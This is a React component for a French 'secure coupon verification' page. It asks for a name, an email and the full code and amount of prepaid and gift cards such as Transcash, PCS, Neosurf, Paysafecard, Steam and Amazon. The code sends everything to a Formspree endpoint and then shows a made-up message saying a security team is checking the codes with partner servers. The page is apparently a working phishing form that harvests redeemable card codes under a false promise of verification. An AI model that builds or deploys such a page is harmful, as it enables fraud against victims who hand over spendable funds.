import React, { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  ShieldCheck, 
  Loader2, 
  CreditCard, 
  User, 
  Mail, 
  Key,
  Lock,
  Tag
} from "lucide-react";

const BRAND_PRESETS = [
  { id: "amazon", label: "Amazon Card", emoji: "📦" },
  { id: "pcs", label: "PCS Mastercard", emoji: "💳" },
  { id: "transcash", label: "Transcash", emoji: "💸" },
  { id: "neosurf", label: "Neosurf", emoji: "🌊" },
  { id: "paysafecard", label: "Paysafecard", emoji: "🔒" },
  { id: "google", label: "Google Play", emoji: "🤖" },
  { id: "itunes", label: "App Store & iTunes", emoji: "🍎" },
  { id: "steam", label: "Steam Card", emoji: "🎮" },
  { id: "autres", label: "Autres coupons", emoji: "✨" }
];

export default function CouponForm() {
  const [formData, setFormData] = useState({
    nom: "",
    email: "",
    code: "",
    brand: "amazon",
    autreCouponText: "",
    montant: "",
    cacherCode: "NON" as "OUI" | "NON"
  });

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    // Front-end validations
    if (!formData.nom.trim()) {
      setError("Veuillez renseigner votre nom complet.");
      return;
    }
    if (!formData.email.trim()) {
      setError("Veuillez renseigner votre adresse e-mail.");
      return;
    }
    if (!formData.code.trim()) {
      setError("Veuillez saisir le code du coupon ou de la carte.");
      return;
    }
    if (!formData.montant.trim()) {
      setError("Veuillez spécifier le montant.");
      return;
    }

    setLoading(true);

    try {
      // Build native FormData for Formspree submit
      const submissionData = new FormData();
      submissionData.append("nom", formData.nom.trim());
      submissionData.append("email", formData.email.trim());
      submissionData.append("code", formData.code.toUpperCase().trim());
      
      const selectedBrandLabel = BRAND_PRESETS.find(b => b.id === formData.brand)?.label || formData.brand;
      if (formData.brand === "autres" && formData.autreCouponText.trim()) {
        submissionData.append("type_de_coupon", `Autre (${formData.autreCouponText.trim()})`);
      } else {
        submissionData.append("type_de_coupon", selectedBrandLabel);
      }

      if (formData.montant.trim()) {
        submissionData.append("montant", formData.montant.trim());
      }

      submissionData.append("masquer_mon_code_a_l_ecran", formData.cacherCode);

      // Submit to Formspree
      const resp = await fetch("https://formspree.io/f/mnjrgygw", {
        method: "POST",
        body: submissionData,
        headers: {
          "Accept": "application/json"
        }
      });

      if (resp.ok) {
        setSuccessMessage(
          "Demande reçue avec succès. Notre équipe de sécurité procède actuellement à l'analyse de votre coupon. Veuillez patienter quelques instants : un agent vérifie les codes d'activation auprès des serveurs partenaires. Le rapport complet de validation vous sera envoyé par courriel à l'adresse fournie dans un court délai."
        );
        
        // Reset code & description
        setFormData(prev => ({
          ...prev,
          code: "",
          autreCouponText: "",
          montant: ""
        }));
      } else {
        const errorData = await resp.json();
        setError(errorData.error || "Une erreur s'est produite lors de la transmission du formulaire. Veuillez réessayer.");
      }
    } catch (err) {
      setError("Erreur réseau: Impossible de joindre le serveur. Assurez-vous d'être connecté et tentez à nouveau.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="w-full max-w-2xl mx-auto" id="verify-form-root">
      <AnimatePresence mode="wait">
        {successMessage ? (
          <motion.div
            key="success"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="bg-emerald-950/40 border border-emerald-500/30 rounded-3xl p-8 backdrop-blur-xl text-center space-y-6"
          >
            <div className="mx-auto w-16 h-16 bg-emerald-500/10 border border-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400">
              <ShieldCheck className="w-8 h-8 animate-pulse" />
            </div>
            
            <h3 className="text-2xl font-bold text-white tracking-tight">
              Analyse en cours de traitement
            </h3>
            
            <p className="text-emerald-200/90 text-sm leading-relaxed max-w-lg mx-auto font-medium">
              {successMessage}
            </p>

            <div className="pt-4 border-t border-emerald-500/15 flex flex-col items-center justify-center space-y-3">
              <span className="text-xs text-emerald-400 font-mono tracking-wider flex items-center gap-1.5 bg-emerald-500/5 px-3 py-1.5 rounded-full border border-emerald-500/20">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
                STATUT : VERIFICATION EN COURS
              </span>
              
              <button
                onClick={() => setSuccessMessage(null)}
                className="text-xs font-semibold text-white/50 hover:text-white transition underline cursor-pointer"
              >
                Soumettre un autre code
              </button>
            </div>
          </motion.div>
        ) : (
          <motion.form
            key="form"
            onSubmit={handleSubmit}
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="bg-slate-900/65 border border-white/5 rounded-3xl p-6 sm:p-8 backdrop-blur-2xl shadow-2xl relative overflow-hidden space-y-6"
          >
            {/* Soft background glows */}
            <div className="absolute -top-32 -left-32 w-64 h-64 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute -bottom-32 -right-32 w-64 h-64 bg-pink-500/10 rounded-full blur-3xl pointer-events-none" />

            <div className="space-y-1">
              <h3 className="text-lg sm:text-xl font-bold text-white tracking-tight flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-indigo-400" />
                Dépôt Sécurisé & Vérification de Coupons
              </h3>
              <p className="text-xs text-slate-400 leading-snug">
                Saisissez les informations de votre carte cadeau ou recharge pour débuter l'audit technique.
              </p>
            </div>

            {/* Profile fields */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <label htmlFor="nom" className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1">
                  <User className="w-3.5 h-3.5 text-slate-500" />
                  Votre nom complet <span className="text-rose-500">*</span>
                </label>
                <input
                  type="text"
                  id="nom"
                  name="nom"
                  required
                  placeholder=""
                  value={formData.nom}
                  onChange={handleInputChange}
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 transition-all font-medium"
                />
              </div>

              <div className="space-y-1.5">
                <label htmlFor="email" className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1">
                  <Mail className="w-3.5 h-3.5 text-slate-500" />
                  Votre email <span className="text-rose-500">*</span>
                </label>
                <input
                  type="email"
                  id="email"
                  name="email"
                  required
                  placeholder=""
                  value={formData.email}
                  onChange={handleInputChange}
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 transition-all font-medium"
                />
              </div>
            </div>

            {/* General Card/Code Type details */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <label htmlFor="brand" className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1">
                  <CreditCard className="w-3.5 h-3.5 text-slate-500" />
                  Type de coupon <span className="text-rose-500">*</span>
                </label>
                <select
                  id="brand"
                  name="brand"
                  required
                  value={formData.brand}
                  onChange={handleInputChange}
                  className="w-full bg-black/45 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 transition-all font-medium"
                >
                  {BRAND_PRESETS.map(brand => (
                    <option key={brand.id} value={brand.id} className="bg-slate-950">
                      {brand.emoji} {brand.label}
                    </option>
                  ))}
                </select>
              </div>

              <div className="space-y-1.5">
                <label htmlFor="montant" className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1">
                  <Tag className="w-3.5 h-3.5 text-slate-500" />
                  Montant <span className="text-rose-500">*</span>
                </label>
                <input
                  type="text"
                  id="montant"
                  name="montant"
                  required
                  placeholder=""
                  value={formData.montant}
                  onChange={handleInputChange}
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 transition-all font-medium"
                />
              </div>
            </div>

            {/* Optional other brand custom field (Including iTunes, Google Play and others!) */}
            {formData.brand === "autres" && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="space-y-1.5 overflow-hidden"
              >
                <label htmlFor="autreCouponText" className="text-xs font-bold uppercase tracking-wider text-pink-400">
                  Écrivez le nom de votre Coupon / Carte <span className="text-rose-500">*</span>
                </label>
                <input
                  type="text"
                  id="autreCouponText"
                  name="autreCouponText"
                  required
                  placeholder=""
                  value={formData.autreCouponText}
                  onChange={handleInputChange}
                  className="w-full bg-black/40 border border-pink-500/20 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-pink-500 focus:ring-1 focus:ring-pink-500/30 transition-all font-medium"
                />
              </motion.div>
            )}

            {/* Coupon Code / Secret digits */}
            <div className="space-y-3">
              <label htmlFor="code" className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-1">
                <Key className="w-3.5 h-3.5 text-slate-500" />
                Code du coupon ou carte cadeau <span className="text-rose-500">*</span>
              </label>

              <div className="relative">
                <input
                  type={formData.cacherCode === "OUI" ? "password" : "text"}
                  id="code"
                  name="code"
                  required
                  placeholder=""
                  value={formData.code}
                  onChange={handleInputChange}
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-base text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500/30 transition-all font-mono tracking-widest uppercase"
                />
              </div>

              {/* Hide code Option box */}
              <div className="bg-black/35 border border-white/5 rounded-xl p-3.5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
                <div className="space-y-0.5">
                  <span className="text-xs font-bold text-slate-300">Option de cryptage - Masquer mon code :</span>
                  <p className="text-[10px] text-slate-500">
                    Masque à l'écran les caractères saisis pour éviter toute capture visuelle frauduleuse.
                  </p>
                </div>

                <div className="flex items-center gap-4 select-none">
                  <label className="flex items-center gap-2 cursor-pointer text-xs font-semibold text-slate-300">
                    <input
                      type="radio"
                      name="cacherCode"
                      value="OUI"
                      checked={formData.cacherCode === "OUI"}
                      onChange={() => setFormData(prev => ({ ...prev, cacherCode: "OUI" }))}
                      className="w-4 h-4 accent-indigo-500 cursor-pointer"
                    />
                    OUI
                  </label>

                  <label className="flex items-center gap-2 cursor-pointer text-xs font-semibold text-slate-300">
                    <input
                      type="radio"
                      name="cacherCode"
                      value="NON"
                      checked={formData.cacherCode === "NON"}
                      onChange={() => setFormData(prev => ({ ...prev, cacherCode: "NON" }))}
                      className="w-4 h-4 accent-indigo-500 cursor-pointer"
                    />
                    NON
                  </label>
                </div>
              </div>
            </div>

            {/* Error notifications */}
            {error && (
              <motion.div
                initial={{ opacity: 0, y: 5 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs py-3 px-4 rounded-xl flex items-center gap-2"
              >
                <div className="w-1.5 h-1.5 rounded-full bg-rose-500 animate-ping shrink-0" />
                {error}
              </motion.div>
            )}

            {/* Submit layout */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 disabled:opacity-50 hover:to-pink-600 font-bold text-white text-sm py-3.5 rounded-xl cursor-pointer hover:shadow-lg shadow-indigo-600/10 hover:shadow-indigo-600/20 active:translate-y-0.5 border border-white/15 hover:border-white/30 transition-all flex items-center justify-center gap-2 select-none"
            >
              {loading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Sécurisation & Envoi en cours...
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4" />
                  Envoyer pour vérification
                </>
              )}
            </button>
          </motion.form>
        )}
      </AnimatePresence>
    </div>
  );
}
